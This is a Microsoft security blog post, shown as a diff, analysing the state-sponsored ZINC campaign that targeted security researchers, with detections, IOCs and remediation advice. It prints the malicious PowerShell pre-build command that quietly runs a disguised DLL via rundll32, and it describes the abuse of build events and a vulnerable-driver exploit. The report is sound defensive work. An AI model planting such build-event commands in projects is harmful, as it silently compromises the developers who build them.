@@ -1,0 +1,94 @@
+In recent months, Microsoft has detected cyberattacks targeting security researchers by an actor we track as ZINC.
+The campaign originally came to our attention after Microsoft Defender for Endpoint detected an attack in progress.
+Observed targeting includes pen testers, private offensive security researchers, and employees at security and tech companies.
+Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ZINC, a DPRK-affiliated and state-sponsored group, based on observed tradecraft, infrastructure, malware patterns, and account affiliations.
+This ongoing campaign was reported by Google’s Threat Analysis Group (TAG) earlier this week, capturing the browser-facing impact of this attack.
+By sharing additional details of the attack, we hope to raise awareness in the cybersecurity community about additional techniques used in this campaign and serve as a reminder to security professionals that they are high-value targets for attackers.
+We also want to thank our industry colleagues at Twitter and GitHub for their collaboration in this investigation and rapid actions to suspend the malicious accounts targeting the security community and our mutual customers.
+The related IoCs and Microsoft Defender for Endpoint product detections we share in this blog will help SOCs proactively hunt for related activity in their environments and elevate any low-level alerts for remediation.
+ZINC used a variety of new techniques to target the victims, including gaining credibility on social media with genuine content, sending malicious Visual Studio projects, and using a watering hole website weaponized with browser exploits.
+In mid-2020, ZINC started building a reputation in the security research community on Twitter by retweeting high quality security content and posting about exploit research from an actor-controlled blog.
+Throughout the lifetime of the campaign, the actor operated several accounts that accounted for roughly 2,000 followers, including many prominent security researchers.
+In the image below, one of the actor-controlled Twitter account retweets another of their accounts to amplify their own posts.
+The posts from the actors received a reasonable amount of attention, usually accumulating several hundred likes or retweets.
+After building their reputation across their established social media accounts, the actors started approaching potential targets on social media platforms such as Twitter and LinkedIn.
+The conversations were often seemingly innocuous, asking security questions or talking about exploit techniques.
+If the researcher was responsive, the actor would offer to move communication to another platform (e.g., email, Discord) in some cases to then send files using encrypted or PGP protected ZIPs.
+ZINC also used their Twitter accounts to post links to a security blog they owned (br0vvnn[.]io).
+These links were also shared by many others in the security community on Twitter and other social media platforms, further deepening trust for the owner and content.
+A blog post titled DOS2RCE: A New Technique To Exploit V8 NULL Pointer Dereference Bug, was shared by the actor on October 14, 2020 from Twitter.
+From October 19-21, 2020, some researchers, who hadn’t been contacted or sent any files by ZINC profiles, clicked the links while using the Chrome browser, resulting in known ZINC malware on their machines soon after.
+This suggests that a Chrome browser exploit chain was likely hosted on the blog, although we haven’t been able to prove this.
+Since some of the victim’s browsers were fully patched, it’s also suspected, but unproven, that the exploit chain used 0-day or patch gap exploits.
+We believe that not all visitors to the site were compromised, even during the dates listed above.
+Some of the files sent by ZINC to researchers were malicious Visual Studio projects that included prebuilt binaries.
+One of the binaries used the well-known name Browse.vc.db but was a malicious DLL rather than a database file.
+Microsoft Defender for Endpoint detects these DLLs as Comebacker malware.
+A pre-build event with a PowerShell command was used to launch Comebacker via rundll32.
+This use of a malicious pre-build event is an innovative technique to gain execution.
+An example of the PowerShell in the pre-build event can be seen here:
+<Command>
+powershell -executionpolicy bypass -windowstyle hidden if(([system.environment]::osversion.version.major -eq 10) -and [system.environment]::is64bitoperatingsystem -and (Test-Path x64\Debug\Browse.VC.db)){rundll32 x64\Debug\Browse.VC.db,ENGINE_get_RAND 7am1cKZAEb9Nl1pL 4201 }
+</Command>
+Pre-build events are stored in the .vcxproj file in Visual Studio solutions.
+The page How to: Use Build Events in MSBuild Projects has a list of other build events and example XML for the events.
+It would also be possible to abuse a custom build step in the same way.
+Once the malicious Visual Studio Project file was built, the process drops C:\ProgramData\VirtualBox\update.bin and adds the file to an autostart registry key.
+Update.bin (SHA-256: 25d8ae46…) is a different 64-bit DLL file embedded inside Browser.VC.db.
+The actors put some effort into modifying the Comebacker malware attributes between deployments; file names, file paths and exported functions were regularly changed so these static IOCs can’t be solely relied upon for dependable detection.
+We were first alerted to the attack when Microsoft Defender for Endpoint detected the Comebacker DLL attempting to perform process privilege escalation.
+See the Microsoft Defender for Endpoint detections section for a full process chain of the attack.
+Klackring is a DLL that registers a malicious service on the targeted machine.
+It was deployed to victims either by the Comebacker malware or an unknown dropper.
+The DLL was dropped to C:\Windows\system32 and saved with the .sys file extension.
+In addition to the social engineering attacks via social media platforms, we observed that ZINC sent researchers a copy of a br0vvnn blog page saved as an MHTML file with instructions to open it with Internet Explorer.
+The MHTML file contained some obfuscated JavaScript that called out to a ZINC-controlled domain for further JavaScript to execute.
+The site was down at the time of investigation and we have not been able to retrieve the payload for further analysis.
+In one instance, we discovered the actor had downloaded an old version of the Viraglt64.sys driver from the Vir.IT eXplorer antivirus.
+The file was dropped to the victim system as C:\Windows\System32\drivers\circlassio.sys.
+The actor then attempted to exploit CVE-2017-16238, described by the finder here, where the driver doesn’t perform adequate checking on a buffer it receives, which can be abused to gain an arbitrary kernel write primitive.
+The actor’s code however appears to be buggy and when attempting to exploit the vulnerability the exploit tried to overwrite some of the driver’s own code which crashed the victim’s machine.
+Other tools used included an encrypted Chrome password-stealer hosted on ZINC domain https://codevexillium[.]org.
+The host DLL (SHA-256: ada7e80c…) was downloaded to the path C:\ProgramData\USOShared\USOShared.bin using PowerShell and then ran via rundll32.
+This malware is a weaponized version of CryptLib, and it decrypted the Chrome password stealer (SHA-256: 9fd0506…), which it dropped to C:\ProgramData\USOShared\USOShared.dat.
+After establishing a command-and-control (C2) channel on a targeted device, the backdoor is configured to check into the C2 servers every 60 seconds.
+Over this C2 channel, the threat actors can execute remote commands to enumerate files/directories and running processes, and to collect/upload information about the target device, including IP address, Computer Name, and NetBIOS.
+Furthermore, we observed some hands-on-keyboard action to enumerate all files/directories on the target disk, create screenshots, and deploy additional modules.
+When malware is run from a malicious Visual Studio project, the following alerts and process tree are generated by Microsoft Defender for Endpoint.
+Multiple alerts, including “Use of living-off-land binary to run malware” and “Process Privilege escalation”, were triggered on the execution of Browser.VC.db and update.bin.
+Microsoft Defender for Endpoint has comprehensive detection coverage for this campaign.
+These detections raise alerts that inform security operations teams about the presence of activities and artifact from the attacks.
+Security operations and incident response teams can use investigation and remediation tools in Microsoft Defender Endpoint to perform deep investigation and additional hunting.
+Alert raised by Microsoft Defender for Endpoint on ComeBacker
+Alert raised by Microsoft Defender for Endpoint on low-reputation arbitrary code executed by signed executable
+If you visited the referenced ZINC-owned blog (br0vvnn[.
+]io), you should immediately run a full antimalware scan and use the provided IOCs to check your systems for intrusion.
+If a scan or searching for the IOCs find any related malware on your systems, you should assume full compromise and rebuild.
+Microsoft assesses that security research was the likely objective of the attack, and any information on the affected machine may be compromised.
+For proactive prevention of this type of attack, it is recommended that security professionals use an isolated environment (e.g., a virtual machine) for building untrusted projects in Visual Studio or opening any links or files sent by unknown parties.
+The below list provides IOCs observed during this activity.
+We encourage our customers to implement detections and protections to identify possible prior campaigns or prevent future campaigns against their systems.
+Azure Sentinel customers can find a Sentinel query containing these indicators in this GitHub repo: https://github.com/Azure/Azure-Sentinel/tree/master/Detections/MultipleDataSources/ZincJan272021IOCs.yaml
+Microsoft 365 Defender customers can find related hunting queries below or at this GitHub repo: https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/
+Further investigation revealed a number of GitHub accounts with names matching the Twitter handles published by Google:
+These are hashes of files we believe to be related to the attack but aren’t Comebacker or Klackring malware.
+This list includes some hashes where we haven’t been able to retrieve a sample but based on the file usage or location looks likely to be related.
+Comebacker Visual Studio Project file execution
+Comebacker file names and exported function name
+Note that the file name was often changed and these names shouldn’t be considered a definitive list:
+This malware was deployed as a .sys file in C:\windows\system32\
+Generic folders and file paths for malware and tooling
+These are folders and file paths that have been used by ZINC for malware and tools but may be used by other actors or produce false positives.
+Look for .bin, .db, .dat, and .cpl files in the following folders, USOShared was most used across victims:
+Check these file paths for additional malware and tooling:
+To locate possible exploitation activity related to the contents of this blog, you can run the following advanced hunting queries via Microsoft Defender for Endpoint:
+Look for backdoor establishing network connections to command and control.
+Run query in Microsoft Defender for Endpoint
+Look for PowerShell launched from MSBUILD with the related commands.
+Run Query in Microsoft Defender for Endpoint
+Look for the presence of malicious files related to this threat.
+Run the below query in Microsoft Defender for Endpoint
+To learn more about Microsoft Security solutions visit our website.
+Bookmark the Security blog to keep up with our expert coverage on security matters.
+Also, follow us at @MSFTSecurity for the latest news and updates on cybersecurity.
+Microsoft is a leader in cybersecurity, and we embrace our responsibility to make the world a safer place.
